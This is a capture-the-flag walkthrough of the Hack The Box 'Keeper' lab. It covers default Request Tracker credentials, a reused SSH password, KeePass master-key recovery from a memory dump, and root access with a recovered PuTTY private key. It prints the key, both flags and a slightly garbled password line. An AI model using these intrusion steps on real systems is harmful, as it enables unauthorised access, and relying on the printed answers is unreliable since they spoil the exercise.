# Keeper

> IP: [10.10.11.227]

## NOTES / STEPS

1. Deploy Machine
2. NMAP
   1. > nmap -sC -sV 10.10.11.227 -oN init_scan
      1. Port 22 -> ssh
      2. Port 80 -> http
3. HTTP 
   1. Navigate to website
      1. We are met with a link to "To raise an IT support ticket, please visit tickets.keeper.htb/rt/"
         1. Need to add this to our /etc/hosts
         2. Clicking the link we are redirected to a login form for REQUEST TRACKER
   2. VERSION
      1. Looking at the login we see "4.4.4+dfsg-2ubuntu1" as a potential version
4. RESEARCH
   1. It looks like the default credentials for RT is root:password
5. RT
   1. Sign into the dashboard
   2. Looking through we see
      1. ADMIN -> USERS
         1. root
         2. lnorgaard
            1. COMMENTS ABOUT USER: "Initial password set to Welcome2023!"
               1. Maybe we can SSH in with this password
6. SSH
   1. Try and sign in as Lise Nørgaard
      1. > ssh lnorgaard@10.10.11.227
         1. PW: Welcome2023!CCESS
7. ENUMERATION
   1. Check sudo privileges (if any)
      1. > sudo -l
         1. RESPONSE: Sorry, user lnorgaard may not run sudo on keeper.
   2. Get user flag
      1. > cat user.txt
         1. FLAG: `abdee41ae0a88b5f7c0e77a375e2aec7`
   3. Check userdirectory
      1. > ls
         1. Interesting File:
         2. -rw-r--r-- 1 root      root      87391651 Feb 20 20:24 RT30000.zip
   4. LINPEAS
      1. Interesting Files
         1. /home/lnorgaard/RT30000.zip
         2. /home/lnorgaard/.gnupg/pubring.kbx
         3. /home/lnorgaard/.gnupg/trustdb.gpg
   5. RT30000.zip
      1. Lets extract this zip file
         1. > unzip RT30000.zip
            1. passcodes.kdbx, KeePassDumpFull.dmp
            2. It looks like there is a keepass dump file and potentially the passcodes
            3. Lets download these and see if we can extract any info from them
               1. > wget http://10.10.11.227:8000/passcodes.kdbx
               2. > wget http://10.10.11.227:8000/KeePassFullDump.dmp
   6. KeePass Dumper
      1. Pull the repo
         1. > git clone https://github.com/matro7sh/keepass-dump-masterkey.git
      2. Run
         1. > python3 poc.py ~/CTF/htb/keeper/KeePassFullDump.dmp

            ```text
               Possible password: ●,dgr●d med fl●de
               Possible password: ●ldgr●d med fl●de
               Possible password: ●`dgr●d med fl●de
               Possible password: ●-dgr●d med fl●de
               Possible password: ●'dgr●d med fl●de
               Possible password: ●]dgr●d med fl●de
               Possible password: ●Adgr●d med fl●de
               Possible password: ●Idgr●d med fl●de
               Possible password: ●:dgr●d med fl●de
               Possible password: ●=dgr●d med fl●de
               Possible password: ●_dgr●d med fl●de
               Possible password: ●cdgr●d med fl●de
               Possible password: ●Mdgr●d med fl●de
            ```

            1. Looks like we have several potential passwords, but not legible
            2. Googling these we see "Rødgrød med Fløde" as a food dish - this could be the password

   7. KEEPASS
      1. Open keepass
      2. Import passcodes.kdbx
         1. PW: rødgrød med fløde
         2. Now we have access to the passwords
      3. LOOKING THROUGH
         1. In here we see a putty key file (normally used for ssh from a windows machine)
         2. > nano putty-file
            1. Paste in the key

               ```putty
                  PuTTY-User-Key-File-3: ssh-rsa
                  Encryption: none
                  Comment: rsa-key-20230519
                  Public-Lines: 6
                  AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
                  8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
                  EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
                  Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
                  FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
                  LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
                  Private-Lines: 14
                  AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
                  oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
                  kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
                  f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
                  VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
                  UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
                  OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
                  in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
                  SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
                  09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
                  xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
                  AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
                  AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
                  NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
                  Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
               ```

8. ESCALATION
   1. We need to convert our putty key file into a normal id_rsa
      1. Install tools
         1. > sudo apt install putty-tools
   2. Convert
      1. > puttygen putty-file.txt -O private-openssh -o keeper_rsa
      2. > chmod 600 keeper_rsa
   3. SSH
      1. > ssh -i keeper_rsa root@keeper.htb
      2. SUCCESS!
9. ROOT
   1. Get the root flag
      1. > cat root.txt
         1. FLAG: `553c83f2ff65530dec1446ad9536ecea`

## QUESTIONS

1. User flag
   1. `abdee41ae0a88b5f7c0e77a375e2aec7`
2. Root flag
   1. `553c83f2ff65530dec1446ad9536ecea`
